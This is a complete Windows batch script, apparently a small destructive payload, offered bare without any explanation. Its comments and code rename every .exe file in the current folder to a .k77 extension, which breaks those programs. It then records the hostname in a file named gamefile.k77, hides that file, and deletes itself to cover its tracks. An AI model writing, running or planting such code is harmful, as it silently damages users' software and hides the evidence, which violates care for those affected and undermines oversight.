@echo off

REM Get the hostname
for /f %%A in ('hostname') do set "HOSTNAME=%%A"

REM Rename all .exe files to .k77
for %%F in (*.exe) do (
    ren "%%F" "%%~nF.k77"
)

REM Save hostname to a file
echo %HOSTNAME% > gamefile.k77

REM Hide the .k77 file
attrib +h gamefile.k77

REM Delete this batch script
del "%~f0"
